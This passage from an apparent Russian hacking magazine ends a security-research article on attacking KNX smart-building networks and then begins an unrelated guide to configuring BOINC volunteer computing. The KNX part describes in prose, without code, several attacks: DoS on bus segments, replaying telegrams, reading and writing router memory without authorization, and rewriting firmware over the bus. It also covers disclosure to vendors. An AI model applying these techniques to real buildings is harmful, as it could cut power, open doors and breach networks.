когда DAF = 0.
  А вот дальше поля уже пойдут интереснее и трак товаться они будут
в зависимости от того, что записано в предшествующих битиках.


## NPCI





Этот байт отвечает за длину данных, передаваемых по KNX‐TP. Увы, не так
много — максимум мы можем передать до 15 байт полезной нагрузки. Поле
Routing counter отвечает за количество «прыжков/переходов» через шлюзы
и gateway. Тем самым реализована борьба против зацик ливания сообщений
и broadcast‐штормов. Идея хорошая и здравая. Но иногда можно не обра‐
щать внимания на это поле, смело ставить значение в 0, и все будет работать
как надо :). Об этом чуть позже. Ну и старший бит, о котором уже немного
упоминали, — бит DAF, отвечающий за то, как трактовать поле receiver ad‐
dress — как групповой адрес или как индивидуальный.


## TPCI/APCI





Поле TPCI проясняет вопрос, дан ные ли это или слу жеб ная информация.
Sequence number в допол нение к TCPI, если у нас диалог между узлами
не ограничивается одной телеграммой, а надо несколько телеграмм. Угадай,
из какого количества телеграмм может состоять «диалог» между узлами?
Если ты подумал, что максимум может быть 16 фреймов, то нет. Их может
быть сколько угодно, просто когда значение sequence number дойдет до 15,
следующее значение будет равно 0 и все пойдет сначала, инкрементируясь
до 15.
  И на десерт — поле APCI. Вот оно‐то как раз зачастую и опре деляет смыс‐
ловую нагрузку сообщений. Разумеется, существуют определенные коды
для того или иного сооб щения:





Как можно заметить, меня сразу заинтересовали следующие команды:
MemoryRead, MemoryWrite, UserMessage. Еще одна забавная команда Escape
расширяет APCI кода на еще некоторое количество дополнительных команд.
   Вот так, шаг за шагом и поле за полем, разобрали фрейм KNX, который
передается по KNX‐TP (для тех, кто забыл, что это такое, — всего лишь пара
проводов, которые подходят к узлу, его запиты вают и служат для передачи
данных). Немного терпения, дорогой читатель, ибо хочу еще несколько слов
сказать о том, во что оборачивает ся телеграмма KNX‐TP, когда она попадает
через шлюз в Ethernet.
   Когда KNX‐TP попадает в Ethernet, эта телеграмма передается по UDP
с помощью cEMI message. Вот как выглядит фрейм KNX в Ethernet‐сети:





А вот как выглядит cEMI message:





Почему тут поставил восклицательный знак и обвел одно поле? Помнишь, я
говорил, что иногда можно не обращать внимания на routing counter в поле
NPCI? Это как раз тот случай: у нас вклинилось еще одно поле control ﬁeld 2,
которое и определя ет количество hop’ов, и у нас идет групповое или инди‐
видуальное сообщение. Но это применимо, только если ты общаешься
с KNX‐сетью с помощью IP‐роутера.


           WARNING

                      Вся информация предоставлена исключительно
                        в ознакомительных целях. Ни редакция, ни автор
                      не несут ответствен ности за любой возможный
                        вред, причиненный матери алами данной статьи.
                   ← НАЧАЛО СТАТЬИCOVERSTORY

     ЛОМАЕМ
   УМНЫЕ
      ЗДАНИЯ
ВТОРГАЕМСЯ В СЕТЬ, УПРАВЛЯЕМ УЗЛАМИ,
    DOS’ИМ И ПРОНИКАЕМ В ТАЙНИКИ





ЧТО ЛОМАЕМ?
В нашей компании мы решили ломать в первую очередь IP‐роутеры. Наде ‐
юсь, следующая картинка пояснит наш выбор.





На этой картинке представлен типовой кусок KNX‐сети. Имеются различные
датчики (sensors) и актуаторы (actuators, исполнительные механизмы). Все
это сидит на шине, которая через Line Couple и/или IP‐роутер может объеди‐
няться в mainline, которая, в свою очередь, под ключена к Ethernet. К Ethernet
уже могут быть подключены различные инженерные системы, завязка на кор‐
поративную сеть, ну и далее, надеюсь, читатель, ты понимаешь, к чему я кло‐
ню. Причем изначально выбираю very hard level, когда рассматриваю сце ‐
нарий «заселил ся в отель, расковырял выключатель и подключился к KNX‐TP».


ДЕЛАЕМ ТЕСТОВЫЙ СТЕНД
Чтобы сделать проект на KNX, надо потратить пару тысяч долларов для покуп‐
ки софта ETS 5. Далее, приехав на объ ект, перед тем как конфигурировать
узел, нужно включить режим программирова ния этого узла.





Для этого надо нажать маленькую кнопоч ку на самой железке — загорится
лампочка, означающая, что узел можно конфигурировать. Да‐да, ты не ошиб‐
ся: нажать кнопку на железке. А для этого может понадо биться сбегать
на чердак соседнего здания, где железка установлена  :). Ну и после этой
небольшой разминки, как истинный интегра тор, сесть за ноут, запустить ETS
и произвести кон фигура цию узла, чтобы у нас пол ноценно зарабо тала BMS.
В нашем же случае мы немного «упростили задачу» и собрали маленькую
сеточку у себя в офисе.





Итак, у нас имеется IP‐роутер Gira, который подключен через Ethernet к ETS5.
Smart button — кнопочка, то есть sensor, и dimmer, то есть actuator. Ну и еще
другой IP‐роутер, который использует ся для сценария «подключились к вык‐
лючателю, хакаем BMS».
  Вообще говоря, когда начинаешь делать research того, что еще мало изу‐
чено, у тебя может не оказаться необходимого инструмента. Так слу чилось
и с нами. Простой пример — у нас не было тран сивера KNX-TP, что бы под‐
ключиться напрямую в линию KNX‐TP, для этого использовали IP‐роутер. А как
смотреть трафик в Ethernet? Слышу‐слы шу нестройный хор голосов, скан‐
дирующих: Wireshark! :) Vox populi не обманывает, но на тот момент Wireshark
не знал, что такое KNXnet/IP, KNX-TP, cEMI message. Он просто показывал
кучу бинарщины, которая переда ется в UDP. И выглядело это как‐то так:





Поэтому была написана простенькая утилит ка, которая всю эту бинарщину
разбирала по полям и выдавала комментарии/пояснения, помогающие
понять data ﬂow. Теперь это ста ло выглядеть приличнее:





Следующая вещь, которую тоже пришлось писать, — поиск узлов на линии.
Ибо  та же ETS5,  что  стоит  кучу баксов, даже на простом  сегменте
из трех‐пяти устройств не всегда могла отоб разить все пять устройств,
которые есть на линии. Глюк, видимо, связан с тем, что, когда в ETS5 нажима‐
ешь кнопку «сканирование линии», она тупо шлет 255 запросов с наимень‐
шим приоритетом по адресам x.y.0 — x.y.255 и потом пытается поймать отве‐
ты от устройств. Поэтому в своей утилите при поиске устройств я поднял при‐
оритет запросов на более высокий и пошел по принципу: «пинганули устрой‐
ство, подождали чуть‐чуть ответ». Если ответа нет, значит, нет и устройства
с этим адресом на линии. Да, получается чуть дольше, но зато гарантирован‐
но находит все устройства на линии.
  Результат неплохой. Отсканировав линию, можно понять, какие устройства
на ней есть. Помимо этого, устройства присылают так называемую mask ver‐
sion, состоящую из 2 байт:





И уже по этой mask version можно примерно понять, насколько инте ресно нам
то или иное устройство, и спрогнозировать, по какому адресу находится IP‐
роутер, является ли узел «простой кнопкой», или есть подозрение, что
это более сложный узел (соответственно, имеющий большую вычислитель‐
ную мощность).


DOS-АТАКА
Как только мы поняли, как происходит общение между узлами в сети KNX, мы
тут же захотели что‐нибудь задосить :). Первым делом мы атаковали один
узел, но оказалось, что можно положить и весь сегмент целиком. Вро де бы
не так страшно, но представь себе владельца отеля, к которому выстроилась
очередь из жильцов, жалующихся, что нет света… ну или ситуацию, когда
пора включать игровое освещение на ста дионе, а оно не вклю чается.
  Помимо этого, в KNX нет ме ханиз ма защиты от дуб лирования сооб -
щения. То есть если ты перехватил KNX‐телеграмму (ну например, так
получилось, что KNX «бегает» через публичный Wi‐Fi в гостинице) и ее пов‐
торно отправил, то можешь побаловаться и повключать/вык лючать свет
в соседнем номере :). Нет, я не шучу — Jesus Molina в своей работе Learn
how to control every room at a luxury hotel remotely: the dangers of in secure home
automation deployment описывает этот сценарий со своим собственным учас‐
тием.
   Кстати, помнишь, как в первой части статьи я обращал твое внимание
на решение по контролю доступа от ABB для гостиниц? Что они предлагают:





Здесь мы видим, что система контроля доступа завязана на шину KNX. И у
меня возникает вопрос: сможем ли мы от крыть дверь в соседний номер,
отправив нужную команду по KNX‐TP? Конкретно эта проблема находится
за пределами сегодняшнего исследования, но скорее все го, сможем!
   Итак, свет выключили, светом поморгали, двери поот крывали — пора дви‐
гаться дальше, в сторону похищения корпоративных секретов. На пути к этой
темной цели может оказаться (и наверняка окажется) тот или иной роутер/
шлюз, который будет обеспечивать сегментирование сети. Кроме этого,
предположим, что интегра тор немного разбирается в вопросах безопасности
и сделал сегментирование сети, настроил, какие KNX‐сообщения могут про ‐
ходить сквозь шлюз, а какие будут отбрасываться, чтобы не засорять лиш‐
ними сообщениями mainline.
   Тухло, не так ли? Вовсе нет :). Расходиться по домам еще рано.
  Помнишь, когда я говорил про APCI‐команды, меня там заинтересовали
команды MemoryRead, MemoryWrite, UserMessage? Так вот, зная, как стро‐
ятся сообщения в KNX‐сети, я решил расширить свою утилитку командой
«прочитай‐ка память». И, наблюдая попутно за data ﬂow в KNX‐сети, заметил,
что перед тем, как общаться с тем или иным узлом, применяется еще авто‐
ризация. Да и документация гласила: для повышения безопасности в KNX
стоит использовать BCU‐ключ (другое название key authorization). Сказано —
сделано, фэншуй соблюден («как начинать общаться с узлом»), и… я получаю
в ответ кусок бинарных данных. Немного доработав утилиту, я получил полный
дамп application memory в пределах от 0x0 до 0xFFFF.





На картинке выше представлен дамп памяти одного из IP‐роутеров. Разгля‐
дывая всю эту бинарщину, я обнаружил, что мне удалось прочитать конфиг
роутера, который содержит его IP‐адрес, маску подсети, шлюз, friendlyname.
Помимо  этого, можно  понять,  используется  ли  «стандартный»  IP:port
(224.0.23.12:3671) для broadcast или какой‐то кастомный. И самое инте рес‐
ное — можно найти «завет ные» байты (на картинке выше обведены в красный
квадратик), которые отвечают за настройки «шлюзования» телеграмм, — то
есть можно ли им дальше идти в Ethernet, или роутер дол жен их отбро-
сить.
   О! Уже полдела сделано. Срочно дописываем в нашу утилиту команду
«писать память» :). Написа ли, запустили, получили ответ «ОK» и с замиранием
сердца тестируем. Барабанная дробь… нам удалось выб раться в Ethernet
и дру гие сег менты KNX‐сети. Просто записав несколько байтов по нужному
адресу! Даже не потребовалось бежать на чердак вклю чать режим прог‐
раммирования (который нужен во время конфигурирования сети). Все это я
тестировал с роутером от ABB.
  Окрылен ный успехом, начинаю делать все то же (сначала читать память)
с IP‐роутером от Gira. И на первом же чтении получаю ошибку и отсутствие
какого‐либо дампа. Я в непонятках. Как так… с ABB все прошло на ура, тот же
скрипт, а Gira молчит как партизан. Смотрю дамп тра фика, сравниваю, про‐
веряю — все аналогично с ABB, но результата нет. Начинаю сравнивать
по шагам, то есть по пакетам. И вижу, что maskversion приходит, а вот когда
отправляю запрос с ключом авторизации, Gira «ругается, дует ся и обижается»
и заканчива ет диалог. Непонят но — мы же читаем память, а это уже достаточ‐
но критичная операция.
  Почему Gira не «проглатывает» клю чик авторизации? Со стороны ETS5
можно спокойно конфигурировать этот роутер, а со стороны KNX‐TP затык.
Что за ерун да, что не так? Решаю переписать скрипт, убрать авторизацию.
Свожу скрипт к диалогу «дай кусок памяти по такому‐то адресу» вместо вся‐
ких долгих приветствий и реверансов. И… при таком раскладе Gira мне отве‐
чает на запрос и отдает кусок памяти. Аналогично упрощаю утилиту по записи
в память. Результат положительный. Записано с первого раза без каких‐либо
проблем.
  Возможно, я чего‐то не понимаю в этом мире. Ты только вдумайся: мы
можем читать и писать в память IP-роуте ра без вклю чения режима
прог раммирования и без клю ча авторизации!
  С третьим роутером, который у нас был (а это Siemens), аналогичная ситу‐
ация — чтение и запись проходят без проблем. В результате мы можем выйти
на другие mainline и area и там устроить все те же самые безобразия
(управлять и досить).
   Теперь еще небольшая  вкусняшка. Помнишь команду UserMessage?
И поле length, которое говорит, что размер макета KNX‐TP может быть
не более 15 байт? Помня о том, как вендоры соблюдают стандарты, решил
попробовать отправить с помощью UserMessage больше чем 15 байт полез‐
ной нагрузки. В общем, выяснилось, что некоторые IP‐роутеры могут про пус‐
тить в одной телеграмме значительно больше бинарных данных. Количес‐
твенная характеристика равна 69 байтам. То есть мы можем по KNX‐TP
отправить сообщение с payload, равным 69 (без учета source or destination
address и прочих служебных полей) байт, и IP‐роутер его прекрасно рет ран‐
слирует в Ethernet. А если пошлем больше, то у Gira, по ходу, будет намечать‐
ся переполнение буфера, так как, помимо этих 69 байт, он отправит в Ethernet
еще пару десятков байт в этом сообщении.
   Тут хочу сделать одно небольшое отступление. В ходе этого исследования
попадались  роутеры,  чувствительные  к «правильному»  Ethernet‐фрейму,
который равен 60 байт. Ибо некоторые пакеты получались равными 59 байт,
и роутер их не понимал. Не хватало такой штуки, как padding. (О том, что такое
padding, можно прочитать, к примеру, тут.)

Как защитить ся и инте ресен ли кому‑нибудь баг репорт?
Теперь пару слов про BCU‐ключ (key authorization). В таком замечательном
документе, как Serial Data Transmission and KNX Protocol by KNX Association,
говорится: These services allow to write keys for the various access levels to bus
devices with memory access protection (16 levels are possible, 0 is the highest
level and 15 is the lowest).
   О! Класс. Можно поставить ключик защиты и усложнить жизнь пло хим пар‐
ням, которые захотят поломать BMS. Сказано — сделано. Написан очеред‐
ной скрипт, который позволяет установить ключ авторизации. Хочу заметить,
что штатные средства ETS5 этого вооб ще не позволяют. Даже упоминания
нет.
  Решил проверить это на IP‐роутере от ABB. Поставил новый ключ авто‐
ризации, роутер рапортует, что ключ сменился. Для чистоты эксперимента
перегружаю по питанию. И… он поз воляет прочитать и записать память
с дефолтным клю чом. Повторно став лю новый ключ авто ризации, получаю
подтверждение, что ключ уста новлен. Без какой‐либо перезагрузки пробую
прочитать память со старым ключом — снова удается.
  Пишу в представительство ABB (как русское, так и европейское), что есть
такой роутер, есть возможность со стороны TP поменять полностью весь кон‐
фиг, и данный роутер не поз воля ет установить BCU‐ключ. На что получаю
ответ от российского предста вительства: мол, «это старая железка, ско ро
выйдет новая версия, используйте ее». Европейское представитель ство дало
более развернутый ответ:

     «Спа сибо за инте рес к нашей продук ции. Мы понима ем вашу
     обес покоенность, но не волнуйтесь. Так как стандарт не обя-
     зыва ет использование BCU-клю ча, то мы пос читали, что реали-
     зовы вать данную функциональность будет лиш ним. Кроме того,
     пользователь может пос читать это дос таточ ной мерой безопас -
      ности и будет вве ден в заблужде ние. Да и вообще — исполь-
      зуйте безопас ные IP-сети».

Примерно таковы по смыслу были ответы.
   Как промежу точное резюме — на данный момент имеется возможность,
подключившись в любом месте к KNX‐сети, устроить DoS, управлять любыми
устройствами, менять конфигурацию любых узлов с помощью команды Write‐
Memory. При этом не всегда требуется BCU‐ключ, нет необходимости вклю‐
чать «режим программирования», да и IP‐роутеры, призванные слу жить
для разграничения трафика, как показывает практика, не будут сильной
помехой.



«YOU NEED TO GO DEEPER»
Во время исследования я натыкался на разные документации к роутерам,
да и KNX‐сети в целом. И не покидало меня чувство, что есть еще что‐то
«вкусное да интересное». Чувство это под креплялось тем, что встречались
datasheet, которые говорили: «мол, не бойтесь окир пичить устройство, если
что — зальете прошивку через KNX‐TP и его восстановите». Да еще на столе
лежит IP‐шлюз Jung, который не работа ет как надо. Пишу в саппорт Jung
с вопросом: есть IP‐шлюз, в ETS5 видит ся, кон фигурится, но вот в Ethernet
ничего не отправляется. Приходит ответ: «А… Так это известная проблема,
вот вам user guide, вот вам софтина, вот вам прошивка, обновите, и все будет
пучком».
  Интересно… Решил выпол нить  их инструкции —  вдруг зарабо тает?
Да дамп обновления сохраню на всякий случай. Обновил про шивку Jung —
работает как следует. Смотрю попутно дамп обновления прошивки, нахожу
еще  интересные  APCI‐коды:  A_UserMemory_Read,  A_UserMemory_Write.
Заодно подворачивается ссыл ка на KNXmap товарища Niklaus’a, где встре‐
чаются эти же самые коды. Начинают закрадываться подозрения. Допиливаю
утилиту до возможности read ﬁrmware. Запускаю команду «читать прошивку»
для Jung, подключившись к нему со стороны KNX‐TP. Получаю кусок бинарных
данных. Открываю прошивку, которую только что залили на этот шлюз. Бинго:
оказывается, read ﬁrmware мне вернула не просто кусок бинаря, а часть про‐
шивки, которая крутится на железке. А раз можно читать про шивку, значит,
таким же способом можно ее и записать.
  Погодите секундочку… я только что сказал «записать прошивку»? Да, все
верно. Найден механизм, как можно, под ключив шись к KNX‐шине в про‐
извольном месте, найти узел, который смот рит в Ethernet, и обновить его
прошивку. Можно обновить на кастомную прошивку, чтобы простой шлюз
превратить во что‐то более серьезное, то есть пробросить подклю чение
до технологической сети. Да, скорость будет не особо высокая для доступа
к этой технологической сети, но не забываем, что это мы сде лали из пуб -
лично го мес та. Усыплять охрану, спиливать замки и лазить по пожарным
лестницам не надо!
   Как и всякий порядочный вайтхет, я написал в пред ставительство Jung
и доложил: «Ребята, можно обновить прошивку со стороны KNX‐TP, ключ
авторизации не нужен, режим программирования не нужен, могу менять нас‐
тройки — IP, маску, gateway». Ответа никакого нет.


ДЕСЕРТ ДЛЯ ТЕРПЕЛИВЫХ, ИЛИ ВЫХОДИМ ЗА ПРЕДЕЛЫ
ЛАБОРАТОРИИ
Скептики скажут: вы тестили KNX‐сеть у себя в офисе, в лабораторных, так
сказать, условиях и наверняка что‐нибудь подстроили и упростили. Чтобы
исключить подобные намеки, нам удалось договориться с одними товари‐
щами протестировать соз данный тулкит на живом объекте, в реальных усло‐
виях. Я приехал к ним на объ ект, подключил ся к выключателю. Послушал тра‐
фик, просканировал узлы. И начал им рассказывать, какой примерно data
ﬂow, какие и сколько узлов у них установлены. Выдал их serial/hardware num‐
ber, сказал, какие приблизительно конфигура ции залиты по узлам. Некото рое
удивление читалось на лицах :).


ПОД КАПОТОМ У РОУТЕРОВ
В качестве дополнительной информации расска жу тебе о том, что внутри
у роутеров, которые мы закупили для исследования.


ABB





На картинке выше показа но, как выглядит снаружи и изнутри данный роутер.
Сердце и мозг тут два ATmega128. Структурная схема примерно следующая:





Одна ATmega связана с трансивером шиной KNX. Другая ATmega отвечает
за связь по Ethernet. Общение происходит через SRAM.
  Было бы стран ным не сказать пару слов о том, как можно обно вить про‐
шивку на данном роутере. Для этого надо выполнить несколько «очень слож‐
ных» шагов:
 • подключиться Ethernet’ом к данному KNX‐роутеру;
 • запустить фирменную утилиту ABB i‐bus IP Firmware Tool;
 • выбрать нужную железку и нажать кнопочку «Обновить прошивку».

Всё. Совсем всё: никакой проверки на целостность, подлинность и вообще
чего‐либо нет.


Gira





В этом IP‐роутере фарша уже побольше:





Есть два Ethernet + SD‐карта для сохранения логов. Кро ме того, используется
ARM. И прошивка уже выглядит не просто как бинарь, а как маленький пол‐
ноценный Linux  :). У которого ко всему прочему есть SSH и GDBserver.
Обновляется прошивка так же, как в ABB: подключились и залили про шивку.
Правда, тут уже есть «проверка». Gira позволя ет залить только последнюю
версию прошивки. Но в документации можно встретить вот такую «вкус‐
няшку»:





Значит, у предыдущего поколения роутеров можно обновить прошивку через
twisted pair, то есть через KNX‐TP.


Siemens





Как видно, имеется впол не прилич ная вычислительная мощь для такой желез‐
ки.
   Ну и естественно, пара слов о том, как обновить прошивку. Тут все сде‐
лано похитрее. Чтобы перевести этот роутер в режим обновления прошивки,
понадобятся танцы с буб ном: выключить/включить устройство, зажать сер‐
висную кнопку, ждать, созерцая огонь ки, пока световая индикация не скажет
о том, что устройство перешло в режим ожидания новой прошивки. Далее
запускаем фирменную  утилиту  от  Siemens  по  обновлению  прошивки
и обновляемся.
  Проверка происходит на канальном уров не. :) Хост отправил 1048 байт.
Роутер шлет обратно эти же байты. Хост смотрит, если пришли те же самые
байты — значит, процесс обновления прошивки идет хорошо.


Для внедрения в сеть первоначально использовался IP‐роутер от ABB. Нам
было этого мало, мы его разобрали, стали использовать бинарный трансивер
в связке с Teensy. А сейчас мы разрабаты ваем полностью свою железку,
которая позволит подключиться к KNX‐сети и найти узлы, у которых можно
обновить прошивку со стороны KNX‐TP, выдать список узлов, не поддержи‐
вающих BCU‐ключ, а те, что поддерживают, — изменить с дефолтно го на про ‐
извольный.



ЗАКЛЮЧЕНИЕ
Что в итоге мы имеем в сухом остатке? Под ключившись в любом месте к KNX‐
шине, можно устроить DoS‐атаку как на конкрет ное устройство, так и на шину
целиком. Можно управлять любым оборудованием, которое подключено
по KNX. Можно беспрепятственно проникать в другие сегменты сети. Читать
и изменять конфигура ции узлов. И как «вишенка на торте» — возможность
прочитать и записать прошивку узлов. Причем в ряде случаев эти узлы могут
быть подключены к Ethernet.
PCZONE





                                                                               Андрей Васильков
                                                                                                редактор, фронемофил, гик,
                                                                                                                                    к. м. н. и т. п.
                                                                                                 angstroem@hotbox.ru



BOINC     К БОЮ!
ПРЕМУДРОСТИ
РАСПРЕДЕЛЕННЫХ
ВЫЧИСЛЕНИЙ
НА ЛИЧНОМ ПРИМЕРЕ




В 2012 году я скачал программу BOINC, зарегистрировался
в паре проектов, и с тех пор свободные вычислительные
ресурсы моего компьютера потихоньку приносят поль зу
обществу. О том, что и как считают распределенно, читай
в статье «Вычисления на дому» в этом номере, а здесь я
расскажу о своем скромном опыте и о разных тонкостях нас‐
тройки и работы BOINC.


Постепенно  к бла гому  делу подключились несколько  друзей, которые
зарегистрировались с той же учетной записью. Именно тогда я понял, нас‐
колько важно правильно выб рать проект и настроить программу: иной раз
маломощная машина с каким‐нибудь Celeron или Turion вдруг вырывалась
в локальный топ, если владелец позволял компьютеру работать без перебо ‐
ев.





    Фрагмент таблицы результативности компьютеров в одном аккаунте


ВЫБИРАЕМ ПРОЕКТ
Выбирать, какому проекту отдать ресурсы своего компьютера, луч ше всего
на страничке BOINC, где они представлены в виде таблицы. Для каждого про‐
екта сразу видна его область исследований, организаторы, поддерживаемое
железо и ОС.
  За пять лет я ознакомил ся с десят ками проектов распределенных вычис‐
лений и принял длительное участие в восьми из них. Это астрофизические
инициативы (theSkyNet POGS и Einstein@Home), медицинские (POEM@Home,
Malaria Control, Rosetta@Home, SIMAP@Home, GPUGRID), а также сту ден‐
ческая сеть Leiden  Classic, в которой моделируются различные задачи
из области динамики в образовательных целях. Последняя примечательна
тем, что любой участник может загрузить в нее свои расчетные задания.





               Общая статистика учетной записи

Вместе с друзьями я перепробовал множество проектов и конфигураций,
пока не нашел свой оптимум. Если понача лу нам удавалось получать лишь
сотню‐другую тысяч очков в месяц, то теперь за день мы легко набираем
больше. Можно достичь еще более вну шительных показателей, просто сос‐
редоточившись  на  GPU‐оптимизированных  проектах,  приносящих  мак ‐
симальное количество очков. Однако мы стараемся не гнаться за рейтингом,
а переключаться между исследованиями и под держивать разные.





               Динамика наших вычислений в BOINC

В данный момент мы участвуем только в ста бильных и активно развивающих‐
ся проектах, которые сложно заподозрить в коммерческом использовании
ресурсов. В частности, это обработ ка снимков с гигапиксельной астрокаме‐
ры (theSkyNet POGS) для составления мультиспектрального обзо ра неба
(подробнее на русском см. здесь), а также поиск радиопульсаров и излу ‐
чаемых ими гравитационных волн (Einstein@Home).
   Как официальный  сайт,  так и сам клиент BOINC отображает толь‐
ко 36 открытых проектов распределенных вычислений — самых известных
и заслуживших хорошую репутацию. Всего же таких проектов больше сотни,
и найти их бывает непросто. Многие анонсируются только внутри академи‐
ческой среды, на каких‐то специализированных форумах и не находят
широкой поддержки.
   Сайт открытой статистики Free‐DC сейчас показы вает данные по 137 про‐
ектам на платформе BOINC, но и это не полный список. Например, россий‐
ские проекты лучше всего искать на BOINC.ru.


ВЫБИРАЕМ ЗАДАНИЯ
У каждого проекта есть своя веб‐страница с более подробным описанием.
Здесь же можно задать индивидуальные настройки расчетов. Если в тво ей
учетной записи несколько компьютеров, то их можно распределить на группы
(например, «дом» и «работа») и задать отдельные установки для групп.





           От дельные настройки для проекта Einstein@Home

В одном проекте может быть несколько заданий разных типов. Они отличают ‐
ся как по сути исследова ний, так и по системным требованиям. Из них разум‐
нее выбрать те, которые эффективнее всего считают ся на твоем компьюте ре.





             Выбор приложений с ускорением на ГП

Простые задания обрабатываются только на ЦП и ограничиваются базовым
набором команд x86‐64. Некоторые имеют специфическую оптимизацию
для расширенных инструкций (например, AVX) и выполняются на таких про‐
цессорах гораздо быстрее.





                   Задание с AVX‐оптимизацией

Другие задания поддерживают архитектуру ARM и запускаются на смартфо ‐
нах, планшетах, кластерах из Raspberry Pi, CubieBoard и прочих подоб ных
девайсах. Единичные проекты (например, ЦЕР На) выполняются в сво ей вир‐
туальной среде и требуют установки VirtualBox.
  Самые сложные задания используют для ускорения расчетов универсаль‐
ные (шейдерные) процессоры видеокар ты — uGPU. Иногда для этого под‐
ходит любая современная видеокарта, а иногда задание поддерживает,
к примеру, только новые чипы AMD с архитектурой GCN или только GPU Nvidia
с CUDA СС v.3.0 и новее.


BOINC      как средс тво стресс‑тес тирова ния
В режиме постоянной обработки BOINC можно использовать для выявления
сбоящего оборудования. Вместо пары часов прогрева в Prime’95 или OCCT
он будет выполнять реальные задания и постоянно сверять правильность их
решения. Никакой синтетический тест не сравнится с BOINC по эффектив‐
ности длительного мониторинга




          Один из компьютеров выполнил задание с ошибкой





ДЕЛАЕМ ПЕРВЫЕ ШАГИ
Клиент BOINC для Windows можно установить как приложение или как сервис.
Второй вариант обеспечивает задани ям BOINC более стабильную работу,
но опаснее в плане потенциальной угрозы для ОС. Также BOINC, работа‐
ющий как сервис, не сможет использовать видеокарту для ускорения рас‐
четов. В общем, это скорее вариант для сер веров.





                   Упрощенный вид клиента BOINC

Сразу после уста новки BOINC он запустится с дефолтными настройками
в упрощенном виде. Стоит переключиться на пол ный вид через верхнее меню
или нажав Ctrl‐Shift‐A. Тогда на отдельных вклад ках ты увидишь все уведом‐
ления, свои проекты, активные задания, сетевую активность, локальную ста‐
тистику и использование дискового пространства.
  Почти все пункты меню хорошо переведены на русский. Они имеют
говорящие названия, но на всякий случай есть и справка. Так что мы не будем
перечислять очевидные вещи, а поговорим о более тонких материях.


BAM!
На официальном сайте ста тистики распределенных вычислений активно рек ‐
ламируется менеджер аккаунтов BOINC под названием BAM. Он облегчает
управление несколькими проектами и компьютерами одновременно, предос‐
тавляя единую страницу настроек. На ней проще отслеживать и вносить
изменения, однако, потеряв пароль доступа к BAM, ты утратишь доступ сразу
ко всем учеткам BOINC. В общем, это как брелок — помогает потерять все
ключи одним махом.



ВРЕМЯ СОБИРАТЬ COBBLESTONES
Если выделить любое задание в очереди и нажать на кнопку «Информация»,
то ты увидишь его описание. Каждая задача имеет свой расчетный объем
вычислений — от нескольких тысяч до миллионов GFLOP (миллиардов опе ‐
раций с плавающей запятой одинарной точности).
  Количество очков, которые начисляют за выполнение задания, завязано
на эту сложность, а сами очки называются Cobblestones. Нужна эта величина
в основном для сравнения трудозат рат. Один Cobblestone — это эквивалент
объема вычислений, который выпол няет эталонный про цессор с произво‐
дительностью 1 гигафлопс за 1/200 суток (то есть 432 миллиарда операций
FP32).
  При сравнимом объеме вычислений задания считаются с разной ско‐
ростью. Код может быть оптимизирован плохо, и тогда задание будет при‐
носить тебе лишь пару очков в час, тогда как другие — десят ки и сот ни тысяч.
Изначально эти очки не имели никакой ценности. Они лишь отражали отно‐
сительный вклад в общее дело и помогали волонтерам подоб рать задания,
которые лучше всего раскрывают потенциал их железа. Ситу ация изменилась
с появлением криптовалют и проектов, в рамках которых выплачивают воз‐
награждение за научные расчеты.
  После выполнения нескольких заданий ты заметишь, что они считаются
с разной эффективностью. Выявить слабые места тебе поможет сбор и ана‐
лиз статистики расчетов. BOINC удобен тем, что показывает все подробности
о работе каждого узла.





                        Ста тистика расчетов


Когда запас тянет карман
По умолчанию BOINC работа ет только в периоды простоя и приостанавлива‐
ет расчеты при каждом чихе пользователя. Он набирает большую очередь
заданий, львиная доля которых не успевает выполниться до расчетного сро‐
ка. Время дедлайна у разных проектов меняется от нескольких дней до двух
недель, поэтому запасать их впрок нецелесообразно. Такие предустановки
остались еще с тех времен, когда постоянное подключение к интернету было
редкостью, да и сами серверы проектов частенько уходили в офлайн.
   Если у тебя (и у сервера раздачи слонов) нет проблем с качеством связи,
то смело заходи в «Парамет ры → Настройки клиента» и на вкладке «Вычис‐
ления» в разделе «Другое» уменьшай значение пункта «Запасать не менее xx
дней работы». Можно поставить и дробные зна чения — оптимальные под‐
бираются экспериментально.





                       Только свежие задания!

В своих нас тройках я задаю в этом пункте значения от 0,05 до 1,0. Сле‐
дующий пункт «Запасать дополнительно» оставляю нулевым. Такие настройки
экономят место на диске и позволя ют получать больше очков. Ты все время
считаешь самые новые задания и быстро сдаешь их. За это начисляются
бонусы — до 50% очков.


Считать всегда!
По опыту знаю, что лучше выделить BOINC фиксированный процент ресурсов
ЦП и включить режим постоянной обработ ки, чем все вре мя приостанав‐
ливать и возобновлять расчеты на полном ска ку. Для пользователей сов‐
ременных компьютеров фоновая нагрузка в четверть мощности проходит
совершенно незаметно.
  Процент ресурсов ЦП для BOINC задается дву мя способами: количеством
ядер и временем их загрузки. Если у тебя четырехъядерный про цессор и ты
хочешь выделить BOINC одно ядро, то в секции «Ограничения исполь‐
зования» измени значение пункта «Использовать не более % процессоров»
на 25%. Одно ядро Core i5 — это как раз 25%.
   Если используешь процессор с двумя ядра ми, то ставь 50% (одно ядро)
и в следующем пункте «Использовать не более % времени ЦП» постепенно
уменьшай значение до тех пор, пока работа не станет комфортной.
   У одноядерных процессоров в первом пункте всегда будет 100% (меньше
одного ядра выделить нельзя), а второй сильно уменьшается. Например,
на старом Celeron комфортная работа сохранялась при выделении BOINC
до 15% времени ЦП.
  Пока я пишу статьи и читаю их в браузере, меня и 75% отъедаемых ресур‐
сов устраивает. Когда запускаю виртуал ки — уже нет. Для такого смешанного
режима есть настройки автоматического поведения BOINC. В разделе
«Управление» отметь «График работы определя ется настройками» и начинай
подбирать наиболее удобные.
  Например, у тебя периодически запускаются игры и тяжелые приложения,
которые занимают почти все ресурсы ЦП. Отметь пункт «Приостановить, если
использование процессора не‐BOINC задачами выше, %» и укажи значение
от 60 до 90%.
  В основной вкладке настроек «Вычисления» можно задать приостановку
любых расчетов или только тех, что опти мизирова ны для GPU, во вре мя
использования компьютера. Если памяти хватает (от 4 Гбайт), то на вклад ке
«Диск и память» можно отметить пункт «Оставлять в памяти неактивные
задания, которые не используют ГП» — это сократит время их повторной заг‐
рузки. Еще можешь уменьшить значение параметра «Запрашивать сох‐
ранение промежуточных результатов…» до двух‐трех минут. Так ты будешь
терять меньше промежуточных результатов при каждом перезапуске заданий.


Яд ра физические и логические
Настраивать BOINC для работы на процессоре с отдельными физическими
ядрами гораздо проще, чем выделять ему логические ядра, реализованные
через Hyper Threading. Зависимость одного потока от другого на том же ядре
осложня ет их совместную работу и порой приводит к ошибкам в расчетах.
